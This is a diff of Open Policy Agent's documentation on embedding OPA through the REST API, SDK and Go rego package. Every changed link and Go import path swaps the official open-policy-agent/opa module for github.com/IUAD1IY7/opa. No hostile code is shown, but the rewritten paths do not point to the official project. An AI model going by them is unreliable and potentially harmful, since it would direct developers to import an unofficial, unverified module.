@@ -26,13 +26,13 @@ OPA supports different ways to evaluate policies.
 
 - The [REST API](./rest-api) returns decisions as JSON over HTTP.
   - Also see the [Language SDKs](/ecosystem/#languages) for working with the REST API in different languages.
-- The [Go API (GoDoc)](https://pkg.go.dev/github.com/open-policy-agent/opa/v1/rego) returns
+- The [Go API (GoDoc)](https://pkg.go.dev/github.com/IUAD1IY7/opa/v1/rego) returns
   decisions as simple Go types (`bool`, `string`, `map[string]interface{}`,
   etc.)
 - [WebAssembly](./wasm) compiles Rego policies into Wasm instructions so they can be embedded and evaluated by any WebAssembly runtime
 - Custom compilers and evaluators may be written to parse evaluation plans in the low-level
   [Intermediate Representation](./ir) format, which can be emitted by the `opa build` command
-- The [SDK](https://pkg.go.dev/github.com/open-policy-agent/opa/v1/sdk) provides high-level APIs for obtaining the output
+- The [SDK](https://pkg.go.dev/github.com/IUAD1IY7/opa/v1/sdk) provides high-level APIs for obtaining the output
   of query evaluation as simple Go types (`bool`, `string`, `map[string]interface{}`, etc.)
 
 ### Integrating with the REST API
@@ -179,11 +179,11 @@ Please see [v0 Backwards Compatibility](./v0-compatibility) for notes on using
 the v0 SDK package.
 :::
 
-The [SDK](https://pkg.go.dev/github.com/open-policy-agent/opa/sdk) package contains high-level APIs for embedding OPA
+The [SDK](https://pkg.go.dev/github.com/IUAD1IY7/opa/sdk) package contains high-level APIs for embedding OPA
 inside of Go programs and obtaining the output of query evaluation. To get started, import the `sdk` package:
 
 ```go
-import "github.com/open-policy-agent/opa/v1/sdk"
+import "github.com/IUAD1IY7/opa/v1/sdk"
 ```
 
 A typical workflow when using the `sdk` package would involve first creating a new `sdk.OPA` object by calling
@@ -200,8 +200,8 @@ import (
 	"context"
 	"fmt"
 
-	"github.com/open-policy-agent/opa/v1/sdk"
-	sdktest "github.com/open-policy-agent/opa/v1/sdk/test"
+	"github.com/IUAD1IY7/opa/v1/sdk"
+	sdktest "github.com/IUAD1IY7/opa/v1/sdk/test"
 )
 
 func main() {
@@ -309,7 +309,7 @@ if err != nil {
 ### Integrating with the Go API
 
 Use the low-level
-[github.com/open-policy-agent/opa/v1/rego](https://pkg.go.dev/github.com/open-policy-agent/opa/v1/rego)
+[github.com/IUAD1IY7/opa/v1/rego](https://pkg.go.dev/github.com/IUAD1IY7/opa/v1/rego)
 package to embed OPA as a library inside services written in Go, when only policy **evaluation** — and
 no other capabilities of OPA, like the management features — are desired. If you're unsure which one to
 use, the SDK is probably the better option.
@@ -317,7 +317,7 @@ use, the SDK is probably the better option.
 To get started import the `rego` package:
 
 ```go
-import "github.com/open-policy-agent/opa/v1/rego"
+import "github.com/IUAD1IY7/opa/v1/rego"
 ```
 
 The `rego` package exposes different options for customizing how policies are
@@ -416,7 +416,7 @@ if !results.Allowed() {
 ```
 
 For more examples of embedding OPA as a library see the
-[`rego`](https://pkg.go.dev/github.com/open-policy-agent/opa/v1/rego#pkg-examples)
+[`rego`](https://pkg.go.dev/github.com/IUAD1IY7/opa/v1/rego#pkg-examples)
 package in the Go documentation.
 
 :::info
